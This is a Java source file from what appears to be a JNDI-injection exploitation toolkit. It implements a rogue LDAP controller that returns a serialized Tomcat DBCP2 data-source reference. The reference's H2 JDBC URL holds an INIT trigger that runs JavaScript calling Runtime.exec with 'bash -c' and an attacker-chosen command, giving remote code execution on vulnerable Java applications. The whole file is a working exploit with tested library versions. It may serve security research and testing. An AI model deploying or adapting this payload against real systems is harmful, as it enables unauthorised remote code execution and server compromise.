package artsploit.controllers;

import artsploit.Config;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.naming.Reference;
import javax.naming.StringRefAddr;

import static artsploit.Utilities.serialize;

/**
 * Yields:
 * RCE by controlling the JDBC URL (connection string) of Tomcat DBCP2 BasicDataSourceFactory class.
 * BasicDataSourceFactory provides an implementation of javax.naming.ObjectFactory that can be used to instantiate a data source
 * and the connection string is controllable via the url attribute.
 * JDBC connection string for an H2 database provides an INIT parameter that can be used to execute an SQL statement.
 * The CREATE TRIGGER statement of the H2 db, supports Javascript code inside the trigger body. So by creating a JDBC
 * connection string to an H2 DB with the INIT parameter set to a CREATE TRIGGER statement containing JS code in the body
 * an RCE can be triggered.
 *
 * @see 
 *     https://www.veracode.com/blog/research/exploiting-jndi-injections-java
 *     https://b1ue.cn/archives/529.html
 * 
 * Requires:
 *  Tomcat DBCP2 and H2 in classpath
 *
 *  Verified on:
 *  - org.apache.tomcat.embed:tomcat-embed-core:8.5.61
 *  - com.h2database:h2:2.1.214
 *
 * @author snowyowl
 */

@LdapMapping(uri = {"/o=dbcp2-h2"})
public class Dbcp2H2 implements LdapController {

    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {

        System.out.println("Sending LDAP ResourceRef result for " + base + " with tomcat-dbcp2-h2-sql payload");

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any

        String javascript = "//javascript\njava.lang.Runtime.getRuntime().exec(['bash', '-c', '"+ Config.command + "'])";
        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;" +
                "init=CREATE TRIGGER cmdExec BEFORE SELECT ON INFORMATION_SCHEMA.USERS AS $$" +
                javascript + " $$";

        Reference ref = new Reference("javax.sql.DataSource", "org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory", null);
        ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
        ref.add(new StringRefAddr("url", url));
        ref.add(new StringRefAddr("username", "root"));
        ref.add(new StringRefAddr("password", "password"));
        ref.add(new StringRefAddr("initialSize", "1"));
        e.addAttribute("javaSerializedData", serialize(ref));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
